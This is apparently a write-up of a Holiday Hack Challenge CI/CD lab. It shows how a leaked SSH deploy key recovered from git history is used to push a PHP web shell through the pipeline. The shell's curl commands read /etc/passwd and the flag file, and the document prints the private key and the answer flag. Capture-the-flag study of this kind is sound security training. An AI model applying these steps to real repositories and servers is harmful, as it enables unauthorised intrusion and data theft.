# Jolly CI/CD
**Difficulty**: :fontawesome-solid-star::fontawesome-solid-star::fontawesome-solid-star::fontawesome-solid-star::fontawesome-solid-star:
**Direct link**: [cicd terminal](https://hhc22-cicd.kringlecon.com/?&challenge=cicd&id=1a9f996e-1860-4c36-be8f-43e4fd87924d)


## Objective

!!! question "Request"
    Exploit a CI/CD pipeline. Get hints for this challenge from Tinsel Upatree in the Elfen Ring.

??? quote "Rippin Proudboot"
    Yes, hello, I'm Rippin Proudboot. Can I help you?<br/>
    Oh, you'd like to help me? Well, I'm not quite sure you can, but we shall see.<br/>
    The elves here introduced me to this new CI/CD technology. It seems quite efficient.<br/>
    Unfortunately, the sporcs seem to have gotten their grubby mits on it as well, along with the Elfen Ring.<br/>
    They've used CI/CD to launch a website, and the Elfen Ring to power it.<br/>
    Might you be able to check for any misconfigurations or vulnerabilities in their CI/CD pipeline?<br/>
    If you do find anything, use it to exploit the website, and get the ring back!


## Hints

??? hint "Switching Hats"
    If you find a way to impersonate another identity, you might try re-cloning a repo with their credentials.

??? hint "Commiting to Mistakes"
    The thing about Git is that every step of development is accessible – even steps you didn't mean to take! `git log` can show code skeletons.


## Solution

??? abstract "Welcome message"
    Greetings Noble Player,

    Many thanks for answering our desperate cry for help!

    You may have heard that some evil Sporcs have opened up a web-store selling
    counterfeit banners and flags of the many noble houses found in the land of
    the North! They have leveraged some dastardly technology to power their
    storefront, and this technology is known as PHP!

    ***gasp***

    This strorefront utilizes a truly despicable amount of resources to keep the
    website up. And there is only a certain type of Christmas Magic capable of
    powering such a thing… an Elfen Ring!

    Along with PHP there is something new we've not yet seen in our land.
    A technology called Continuous Integration and Continuous Deployment!

    Be wary!

    Many fair elves have suffered greatly but in doing so, they've managed to
    secure you a persistent connection on an internal network.

    BTW take excellent notes!

    Should you lose your connection or be discovered and evicted the
    elves can work to re-establish persistence. In fact, the sound off fans
    and the sag in lighting tells me all the systems are booting up again right now.

    Please, for the sake of our Holiday help us recover the Ring and save Christmas!

Start by cloning the repository mentioned by [Tinsel Upatree](o6.md) and look at the Git logs using `git log`. One of the commit messages says `whoops` and so that (or the previous commit) could be interesting to look at.

```
commit e19f653bde9ea3de6af21a587e41e7a909db1ca5
Author: knee-oh <sporx@kringlecon.com>
Date:   Tue Oct 25 13:42:54 2022 -0700

    whoops

commit abdea0ebb21b156c01f7533cea3b895c26198c98
Author: knee-oh <sporx@kringlecon.com>
Date:   Tue Oct 25 13:42:13 2022 -0700

    added assets
```

`git show abdea0ebb21b156c01f7533cea3b895c26198c98` shows that a private SSH key `/.ssh/.deploy` was inadvertedly added to the repository.

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4gAAAJiQFTn3kBU5
9wAAAAtzc2gtZWQyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4g
AAAEBL0qH+iiHi9Khw6QtD6+DHwFwYc50cwR0HjNsfOVXOcv7AsdI7HOvk4piOcwLZfDot
PqBj2tDq9NBdTUkbZBriAAAAFHNwb3J4QGtyaW5nbGVjb24uY29tAQ==
-----END OPENSSH PRIVATE KEY-----
```

It also contains information about the associated public key at `/.ssh/.deploy.pub` which tells us the associated user is `sporx@kringlecon.com`. Both files are removed again in the following `e19f653bde9ea3de6af21a587e41e7a909db1ca5` commit with the `whoops` commit message.

```
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP7AsdI7HOvk4piOcwLZfDotPqBj2tDq9NBdTUkbZBri sporx@kringlecon.com
```

Now that we have the SSH key for `sporx@kringlecon.com` we can clone the repository again using the Git protocol (instead of HTTP), using `git clone git@gitlab.flag.net.internal:rings-of-powder/wordpress.flag.net.internal.git`. This now allows us to commit files to the repository as well (i.e., make the CI/CD pipeline publish our files). First set up the proper Git email and username configuration values. And store the private key in `~/.ssh/id_rsa` (remember to give both the `.ssh` folder and `id_rsa` restricted permissions).

```shell
git config --global user.email "sporx@kringlecon.com"
git config --global user.name "knee-oh"
```

We can add a [simple PHP webshell](https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985) as a test.

```shell
cd wordpress.flag.net.internal
mkdir crahan
cd crahan
nano shell.php
cd ..
git add crahan
git commit -m 'adding a shell'
git push origin main
```

Now test the shell using something like `curl http://wordpress.flag.net.internal/crahan/shell.php?cmd=cat%20/etc/passwd` which executed `cat /etc/passwd` on the host. Roaming around we can find a `flag.txt` file in `/`. Using `curl http://wordpress.flag.net.internal/crahan/shell.php?cmd=cat%20/flag.txt` tells us the flag value is `oI40zIuCcN8c3MhKgQjOMN8lfYtVqcKT`

!!! done "Answer"
    `oI40zIuCcN8c3MhKgQjOMN8lfYtVqcKT`

## Response

!!! quote "Rippin Proudboot"
    How unexpected, you were actually able to help!<br/>
    Well, then I must apoligize for my dubious greeting.<br/>
    Us Flobbits can't help it sometimes, it's just in our nature.<br/>
    Right then, there are other Flobbits that need assistance further into the burrows.<br/>
    Thank you, and off you go.
